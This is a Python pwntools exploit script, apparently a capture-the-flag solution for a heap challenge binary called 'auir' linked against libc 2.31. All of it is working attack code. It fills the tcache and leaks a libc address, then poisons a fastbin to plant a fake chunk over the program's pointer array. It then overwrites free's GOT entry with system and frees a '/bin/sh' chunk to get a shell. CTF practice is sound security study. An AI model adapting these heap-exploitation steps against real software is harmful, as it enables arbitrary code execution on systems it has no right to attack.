import pwn as p

# target = p.process('./0ctfbabyheap', env={'LD_PRELOAD': './libc-2.23.so'})
target = p.process('./auir')
# p.gdb.attach(target)

elf = p.ELF('./auir')
libc = p.ELF('./libc-2.31.so')
# methods to stop making pwn whine about bytes


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def make_zealots(size: int, payload: bytes):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'1')
    target.sendline(b(str(size)))
    target.sendline(payload)


def destroy_zealots(index: int):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'2')
    target.sendline(b(str(index)))


def fix_zealots(index: int, size: int, payload: bytes):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'3')
    target.sendline(b(str(index)))
    target.sendline(b(str(size)))
    target.send(payload)


def display_skills(index: int):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'4')
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'[*]SHOWING....\n'))
    line = target.recvuntil(b'|-------------------------------|').rstrip(b'|-------------------------------|')
    return line


# fill tcache
for i in range(7):
    make_zealots(0xf0, b'')
    make_zealots(0x70, b'')


make_zealots(0xf0, b'0'*0xf0)  # id 14
make_zealots(0x70, b'1'*0x70)  # id 15
make_zealots(0xf0, b'2'*0xf0)  # id 16
make_zealots(0x70, b'3'*0x70)  # id 17
make_zealots(0x70, b'4'*0x70)  # id 18
make_zealots(0x70, b'5'*0x70)  # id 19

for i in range(7):
    destroy_zealots(i)
    destroy_zealots(i+7)

destroy_zealots(16)
destroy_zealots(17)

leak = p.u64(display_skills(16)[:8])
print('leak:', hex(leak))
libc_base = leak - 0x1ebbe0
print('libc_base:', hex(libc_base))

destroy_zealots(18)
destroy_zealots(19)


# let's place fake chunk at the root of array of malloced ptrs
fake_chunk = 0x605310-0X18
fix_zealots(19, 0x70, p.p64(fake_chunk) + p.p64(0) + b'6'*0x60)


# use up all tcache so we can use our fake chunk from fastbin
for i in range(8):
    make_zealots(0x70, b'_'*0x70)


# create a chunk that will overwrite the first item of the chunk list to point to free's entry in got table
make_zealots(0x70, b'7')  # id 28
fix_zealots(28, 0x10, p.p64(0)+p.p64(elf.got['free']))

# now let's replace the free entry with libc's system
system_ptr = libc_base + libc.symbols['system']
fix_zealots(0, 0x8, p.p64(system_ptr))

# write our favorite string somewhere
fix_zealots(1, 0x9, b'/bin/sh\x00')

# destroying it will call `free` which has been replaced by `system` in the got table
destroy_zealots(1)

target.interactive()
